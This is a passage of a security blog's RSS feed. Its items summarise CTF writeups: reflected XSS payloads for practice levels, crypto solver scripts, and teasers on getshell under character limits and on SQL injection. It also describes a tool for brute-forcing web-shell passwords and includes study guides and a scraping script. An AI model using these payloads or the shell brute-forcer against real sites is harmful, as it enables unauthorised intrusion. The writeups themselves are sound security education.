Level1 1 2 3 4 5 6 view-source:http://47.94.13.75/test/level1.php?name=test &amp;lt;h2 align=center&amp;gt;欢迎用户test&amp;lt;/h2&amp;gt; 直接在文本中输出用户提交的变量 http://47.94.13.75/test/level1.php?name=&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; 收获：为HTML body添加标签。 Level2 1 2 3 4 5 6 view-source:http://47.94.13.75/test/level2.php?keyword=test &amp;lt;input name=keyword value=&amp;#34;test&amp;#34;&amp;gt; 直接在标签属性中用户提交的变量 http://47.94.13.75/test/level2.php?keyword=&amp;#34;&amp;gt;&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; 收获：闭合标签属性的双引号、闭合标签并在标签外添加script标签。 Level3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 view-source:http://47.94.13.75/test/level3.php?keyword=&amp;#39;;!-&amp;#34;&amp;lt;findneo&amp;gt;={()}/\%26 &amp;lt;h2 align=center&amp;gt;没有找到和&amp;#39;;!-&amp;amp;quot;&amp;amp;lt;findneo&amp;amp;gt;={()}/\&amp;amp;amp;相关的结果.&amp;lt;/h2&amp;gt; &amp;lt;input name=keyword value=&amp;#39;&amp;#39;;!</description></item><item><title>华为2018年校园招聘软件题</title><link>https://ret2neo.cn/post/180404huaweiexam/</link><pubDate>Wed, 04 Apr 2018 00:13:26 +0800</pubDate><guid>https://ret2neo.cn/post/180404huaweiexam/</guid><description>2018.4.3 19:00 ~ 2018.4.3 21:00
求回文子字符串数量 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import sys def check(s): length=len(s) for i in range(length): if s[i]!=s[length-1-i]: return 0 return 1 s=sys.stdin.readline().strip() res=0 try: for i in range(len(s)): for j in range(i+1,len(s)+1): if check(s[i:j]): res=max(res,len(s[i:j])) except: print res exit(0) print res 根据规则输出IPv6地址类型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import sys def check(ip): if len(ip)!</description></item><item><title>二进制安全学习规划指南</title><link>https://ret2neo.cn/post/180404binstarter/</link><pubDate>Wed, 04 Apr 2018 00:09:57 +0800</pubDate><guid>https://ret2neo.cn/post/180404binstarter/</guid><description>note of https://www.ichunqiu.com/course/56927
Hacking三步曲 理解系统（Understanding） 系统性的基础课程学习，深入理解计算机系统运作机制。 破坏系统（Breaking） 学习与创造漏洞挖掘与利用技巧 重构系统（Reconstruction） 设计与构建系统防护 基础课程学习 核心基础课程——计算机的工作原理 体系结构
CPU的设计与实现 机器指令与汇编语言 指令的解码、执行 内存管理 CMU 18-447 Introduction to Computer Architecture https://www.ece.cmu.edu/~ece447/s15/doku.php Labs: implement a MIPS CPU using Verilog 编译原理
编译器的设计与实现 自动机、词法分析、句法分析 运行时 程序静态分析 Stanford CS-143 - Compilers http://web.stanford.edu/class/cs143/ PA: Compilers for cool language 操作系统
操作系统的设计与实现
系统的加载与引导 用户态和内核态、系统调用、中断和驱动 进程于内存管理、文件系统 虚拟机 NT 6.828 - Operating System Engineering
https://pdos.csail.mit.edu/6.828/2016/
Labs: Implement jos
Xv6 , a simple Unix-like teaching operating system</description></item><item><title>有道云笔记markdown文档插入图片</title><link>https://ret2neo.cn/post/180327ynotewithtypora/</link><pubDate>Tue, 27 Mar 2018 16:35:22 +0800</pubDate><guid>https://ret2neo.cn/post/180327ynotewithtypora/</guid><description>阶段性地优雅地解决了这个问题！
前段时间因为印象笔记同步出错我不得不购买其高级版本来恢复历史，但是它随着内容增多日渐卡顿这一点令人愈发难以忍受，此外，不支持markdown也一直如鲠在喉，于是我决定再试试之前因为广告问题不愿多用的有道云笔记，竟然发现它非常流畅，支持多层级目录，支持markdown，界面优雅，这让印象笔记之于它就像IE之于Chrome，没办法，我想我只能选择Chrome。
但是有道云也有些小问题，一是markdown不支持直接使用本地图片，二是不支持公式渲染。总的来说，它的markdown编辑功能和Typora比起来简直是小巫见大巫。稍加探索，发现一个有趣的情况，就是有道云笔记新建的markdown笔记就是以同名markdown格式文件保存在本地的，这样一来不就可以用Typora直接编辑了？
所以以后记笔记的工作流就变成了：
打开有道云笔记=&amp;gt;新建markdown笔记foo.md=&amp;gt;使用神器Everything搜索foo.md=&amp;gt;用默认关联md文件的Typora打开=&amp;gt;编辑md文件=&amp;gt;回到有道云笔记，刷新文件预览（点到别的笔记，再回到foo.md，文件内容会重新加载）
非常完美。
Typora从0.9.47版本左右开始支持直接粘贴剪贴板图片，默认以时间戳为文件名保存到temp文件夹（可以在 偏好设置-&amp;gt;编辑器-&amp;gt;图片插入 中设置默认保存位置）来引用，并且支持直接复制到其他文件夹，真是非常棒的体验，必须感谢开发者！
另外，有道云不支持C:\foo\bar.jpg 的引用，但是C:/foo/bar/jpg 却可以被识别；Typora两者都可以识别。
所以当我们回到插入图片的问题，就会发现这不是问题了。只要在Typora编辑完毕后将所有图片复制到一个目录（比如C:/foo/ynote/img）下（如果后续Typora图片粘贴加入了自定义任意文件夹的功能，那么复制这一步也可省去了），然后CTRL+H 将所有图片引用地址中的目录部分一键替换成有道云笔记可解析的形式（如将C:/Users/PCName/AppData/Local/Temp/替换成C:\foo\ynote\img\），这样在有道云笔记和Typora中就都可以预览了。
那么C:/foo/ynote/img 下的图片岂不是就不可以同步了，是的，但比起清爽的体验这只是小节了，我们可以把该目录用坚果云等同步软件同步一下就好了。
话说回来，坚果云+Typora+本地文件系统 不就够了，还要什么自行车？</description></item><item><title>第二届强网杯全国网络安全挑战赛</title><link>https://ret2neo.cn/post/180325qwbwp/</link><pubDate>Sun, 25 Mar 2018 22:28:44 +0800</pubDate><guid>https://ret2neo.cn/post/180325qwbwp/</guid><description>MISC Welcome 使用stegsolve打开，在Analyse-&amp;gt;Stereogram Solver 处改变偏移即可。
Crypto streamgame1 streamgame1.py
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 from flag import flag assert flag.startswith(&amp;#34;flag{&amp;#34;) assert flag.endswith(&amp;#34;}&amp;#34;) assert len(flag)==25 def lfsr(R,mask): output = (R &amp;lt;&amp;lt; 1) &amp;amp; 0xffffff i=(R&amp;amp;mask)&amp;amp;0xffffff lastbit=0 while i!=0: lastbit^=(i&amp;amp;1) i=i&amp;gt;&amp;gt;1 output^=lastbit return (output,lastbit) R=int(flag[5:-1],2) mask = 0b1010011000100011100 f=open(&amp;#34;key&amp;#34;,&amp;#34;ab&amp;#34;) for i in range(12): tmp=0 for j in range(8): (R,out)=lfsr(R,mask) tmp=(tmp &amp;lt;&amp;lt; 1)^out f.</description></item><item><title>N1CTF baby_N1ES writeup</title><link>https://ret2neo.cn/post/180310n1ctfwp/</link><pubDate>Sat, 10 Mar 2018 23:18:30 +0800</pubDate><guid>https://ret2neo.cn/post/180310n1ctfwp/</guid><description>baby_N1ES 题目提供两个文件，challenge.py和N1ES.py 。
虽然似乎在模仿AES，但是实际上明文和密文是一一映射的，复杂度不是恶心的100^48 而只是100*48 ，穷举是很快的。一个小障碍是N1ES.py 第71行的L, R = R, L ，这导致了明文的[0:8] 、[8:16]、[16:24]、[24:32]、[32:40]、[40:48] 分别对应的是密文的[8:16]、[0:8] 、[24:32]、[16:24]、[40:48]、 [32:40] ，写穷举脚本时需要注意。
crack.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import base64,string,N1ES key = &amp;#34;wxy191iss00000000000cute&amp;#34; c = base64.b64decode(&amp;#34;HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx&amp;#34;) n1es = N1ES.N1ES(key) f=&amp;#34;&amp;#34; for i in xrange(3): for j in xrange(16): for k in string.printable: s=&amp;#34;x&amp;#34;*i*16+&amp;#34;x&amp;#34;*j+k+&amp;#34;x&amp;#34;*(48-i*16-j-1) e=n1es.encrypt(s) check=c[i*16+j+8]==e[i*16+j+8] if j&amp;lt;8 else c[i*16+j-8]==e[i*16+j-8] if check: f+=k break print f # N1CTF{F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d_/--/} challenge.</description></item><item><title>收集整理一个人所有的微博</title><link>https://ret2neo.cn/post/180309retrieveweiboposts/</link><pubDate>Fri, 09 Mar 2018 00:01:39 +0800</pubDate><guid>https://ret2neo.cn/post/180309retrieveweiboposts/</guid><description>项目地址在 Github
人生活在社区里，对一个常使用微博的人来说，微博记录和反映了他在一段时间内所接触的信息，思考的问题和表达的观点，是值得研究的。如果这个研究对象是一个优秀的人，这里面的价值可能比想象要大。
很显然，要做成收集整理一个人所有的微博 这件事，首先是收集，其次是整理。
收集主要想到有三种方式：
找现成工具（无趣，暂不考虑）。 在https://m.weibo.cn/u/14015127xxx 页面一直按END 键，然后页面会不断异步发送请求以增加页面内容，直到全部内容都被获取。 可以看到第二种方法中的请求是向https://m.weibo.cn/api/container/getIndex?type=uid&amp;amp;value=1401527xxx&amp;amp;containerid=1076031401527xxx&amp;amp;page=1 发送GET请求，只需迭代page的参数即可得到所有数据。 方法二实践 用如下简单脚本模拟按键行为，泡杯茶观察成果。
1 2 3 4 5 6 7 8 9 10 11 import win32api import time print time.asctime() cnt=0 while 1: cnt+=1 win32api.keybd_event(35, 0, 0, 0) #35 stands for &amp;#34;END&amp;#34; key; 0 means hold down win32api.keybd_event(35, 0, 1, 0) # 1 means hold up print cnt, time.sleep(2) print time.asctime() 发现按了几十下页面就开始不变化了，观察请求发现都是发给page=50的，想必是做了限制，最多获取50条记录，暂告失败。
方法三实践 要用这个方法首先最好知道总共有多少page，用二分法手动测，很快就能发现目标用户共有1542个page的记录，然后写个脚本dump下这些响应，保存成json文件，以供后面处理即可。
1 2 3 4 5 6 7 8 9 10 11 12 13 14 from requests import * from time import * import json print asctime() url=&amp;#34;https://m.</description></item><item><title>网络安全学习资料</title><link>https://ret2neo.cn/post/180308newbiesecuritylist/</link><pubDate>Thu, 08 Mar 2018 14:31:44 +0800</pubDate><guid>https://ret2neo.cn/post/180308newbiesecuritylist/</guid><description>项目地址在 Github：https://github.com/findneo/Newbie-Security-List
Newbie-Security-List 一桌菜，十几盘，有荤有素，有凉有热，怎么吃呢？你可以找一盘看起来好吃的，也可以找一盘离自己近的，都行。但是，得动筷子。不管怎么吃，最重要的是得动筷子。学技术也是一样。
有的人死活不动筷子，还不断念叨：“我要开始吃了。我马上就要开始吃了。我只要开始吃就能吃饱。我吃饱了就不饿了。你能不能告诉我该先吃哪一盘？先冷盘后热菜再喝汤这样是不是最好？但是我听说广东人都是先喝汤？这盘菜会不会太远了？这盘会不会太油腻？我吃饱了万一想拉屎你们这里有厕所吗？我真的马上就要开始吃了……为什么我现在还是饿？你能不能帮帮我？”
by tombkeeper @2017-11-28
乌云 在线漏洞库/知识库 https://wooyun.shuimugan.com/ http://cb.drops.wiki/ http://wooyun.chamd5.org/ http://wooyun.jozxing.cc/ https://web.archive.org/web/20160628133257/http://www.wooyun.org:80/ （GFW） 在线知识库 https://superkieran.github.io/WooyunDrops/#!/ https://wooyun.js.org/ https://web.archive.org/web/20160628084846/http://drops.wooyun.org:80/ （GFW） 在线漏洞库 http://bug.p0sec.net/ https://web.archive.org/web/20160625075226/http://www.wooyun.org:80/bugs （GFW） 本地搭建 B/S型 https://github.com/hanc00l/wooyun_public
硬盘搜索型 链接: WooYun漏洞、知识库收集(超详细版) 密码: 28gr
everything : search file by name on disk.
agentransack/FileLocatorPro : search file by content on disk。
CTF BREAK &amp;amp; WATCH 文档 https://beginners.re/ https://leanpub.com/web-hacking-101 https://ctf-wiki.github.io/ctf-wiki/index.html https://www.pediy.com/kssd/ https://paper.seebug.org/ http://evilcos.me/security_skill_tree_basic/index.html https://book.nmask.cn/ GitHub https://github.com/jekil/awesome-hacking/ https://github.com/ctfs/ https://github.com/joe-shenouda/awesome-cyber-skills https://github.com/CHYbeta/Web-Security-Learning https://github.com/tom0li/collection-document 安全导航 https://navisec.it/ http://www.</description></item><item><title>一句话快速爆破脚本</title><link>https://ret2neo.cn/post/180304stealshell/</link><pubDate>Sun, 04 Mar 2018 22:48:13 +0800</pubDate><guid>https://ret2neo.cn/post/180304stealshell/</guid><description>思路来自爱春秋文章python之提速千倍爆破一句话 ，据说源头是吐司文章《让你的一句话爆破速度提升千倍》。
速度提升的关键在于一次尝试提交多个可能的密码，实测在Apache+PHP下使用POST方式请求可高达四千万条密码每次（耗时约20秒，GET方式请求只能达到两百条左右），效果可以说非常惊人，如果有一个足够好的字典，那将无往不利。
思路举例 1 2 3 4 慢速： http://127.0.0.1/xiao.php?pass=echo(%22pwd:pass%22); 快速： http://127.0.0.1/xiao.php?pass=echo(%22pwd:pass%22);&amp;amp;findneo=echo(%22pwd:findneo%22); 用法 1 2 3 4 5 6 7 8 9 10 Usage: stealshell.py [options] Options: -h, --help display this message -u URL, --url=URL Target URL;This option must be provided to define the target (e.g. &amp;#34;http://127.0.0.1/xiao.php&amp;#34;) -m METHOD request method (support GET/POST,GET is default ) -d DICT the filename of candidate passwords (e.g. &amp;#34;shell_pass_dic.txt&amp;#34;) -n NUM the number of passwords that will be submitted in each request (219 is default) 依赖库 python2.</description></item><item><title>“华为杯”极客出发XMan冬令营线上CTF解题赛</title><link>https://ret2neo.cn/post/180107xmancamponlinewp/</link><pubDate>Sun, 07 Jan 2018 19:11:25 +0800</pubDate><guid>https://ret2neo.cn/post/180107xmancamponlinewp/</guid><description>只做了个签到题，总的来说是一个脑洞和简单AES加密的结合。</description></item><item><title>第二届美亚柏科邀请赛</title><link>https://ret2neo.cn/post/171223meiyactfwp/</link><pubDate>Sat, 23 Dec 2017 20:36:25 +0800</pubDate><guid>https://ret2neo.cn/post/171223meiyactfwp/</guid><description>盲注点隐藏的挺好</description></item><item><title>IP地址混淆</title><link>https://ret2neo.cn/post/171125textualrepresentationofipaddress/</link><pubDate>Sat, 25 Nov 2017 16:18:25 +0800</pubDate><guid>https://ret2neo.cn/post/171125textualrepresentationofipaddress/</guid><description>一个IP地址，可能有上百种面目</description></item><item><title>HITCON CTF 2017 BabyFirst Revenge and v2 writeup</title><link>https://ret2neo.cn/post/171112hitconctfbabyfirstrevengeserieswp/</link><pubDate>Sun, 12 Nov 2017 17:14:27 +0800</pubDate><guid>https://ret2neo.cn/post/171112hitconctfbabyfirstrevengeserieswp/</guid><description>绕过四个字符限制getshell</description></item><item><title>如何绕过四个字符限制getshell</title><link>https://ret2neo.cn/post/171110bypass4climit/</link><pubDate>Fri, 10 Nov 2017 18:34:05 +0800</pubDate><guid>https://ret2neo.cn/post/171110bypass4climit/</guid><description>巧用Linux命令实现限制条件下的注入</description></item><item><title>利器</title><link>https://ret2neo.cn/post/171103computertools/</link><pubDate>Fri, 03 Nov 2017 12:50:51 +0800</pubDate><guid>https://ret2neo.cn/post/171103computertools/</guid><description>记录一些超好用的工具</description></item><item><title>用python实现几种常见简单加密</title><link>https://ret2neo.cn/post/171015pythonsnippets/</link><pubDate>Sun, 15 Oct 2017 16:45:21 +0800</pubDate><guid>https://ret2neo.cn/post/171015pythonsnippets/</guid><description>凯撒加密，摩斯电码，栅栏密码，base家族混合编解码。</description></item><item><title>2017 MIAC移动安全赛</title><link>https://ret2neo.cn/post/171015miacwp/</link><pubDate>Sun, 15 Oct 2017 16:25:04 +0800</pubDate><guid>https://ret2neo.cn/post/171015miacwp/</guid><description>┏ (゜ω゜)=☞ 滑稽树上滑稽果</description></item><item><title>南邮CTF平台 Vigenere writeup</title><link>https://ret2neo.cn/post/171005nuptvigenerewp/</link><pubDate>Thu, 05 Oct 2017 19:40:09 +0800</pubDate><guid>https://ret2neo.cn/post/171005nuptvigenerewp/</guid><description>题目挺不错的，实打实，没脑洞，也锻炼了使用python的能力。</description></item><item><title>南邮CTF平台综合题2writeup</title><link>https://ret2neo.cn/post/171004nuptzonghe2wp/</link><pubDate>Wed, 04 Oct 2017 21:04:34 +0800</pubDate><guid>https://ret2neo.cn/post/171004nuptzonghe2wp/</guid><description>通过SQL注入得到后台登陆密码，连接管理员自用的回调后门。</description></item><item><title>命令行拨号上网</title><link>https://ret2neo.cn/post/171003cmdsurfnet/</link><pubDate>Tue, 03 Oct 2017 23:52:02 +0800</pubDate><guid>https://ret2neo.cn/post/171003cmdsurfnet/</guid><description>解放鼠标，从命令行连接与断开网络</description></item><item><title>博客搭建与自定义</title><link>https://ret2neo.cn/post/170926hexoconfig/</link><pubDate>Tue, 26 Sep 2017 18:29:02 +0800</pubDate><guid>https://ret2neo.cn/post/170926hexoconfig/</guid><description>或许，记录在印象笔记和在博客会有不同，但是究竟，不同在哪里呢？</description></item><item><title>南京邮电大学网络攻防训练平台writeup</title><link>https://ret2neo.cn/post/170924nuptctfwp/</link><pubDate>Sun, 24 Sep 2017 11:06:34 +0800</pubDate><guid>https://ret2neo.cn/post/170924nuptctfwp/</guid><description>这是个不错的平台，学到了一些，也发现了更多需要深入学习的东西。</description></item><item><title>武汉大学C语言上机训练系统练习</title><link>https://ret2neo.cn/post/160820whuojstarter/</link><pubDate>Sat, 20 Aug 2016 08:15:01 +0800</pubDate><guid>https://ret2neo.cn/post/160820whuojstarter/</guid><description>2016年8月初学编程时的训练。</description></item></channel></rss>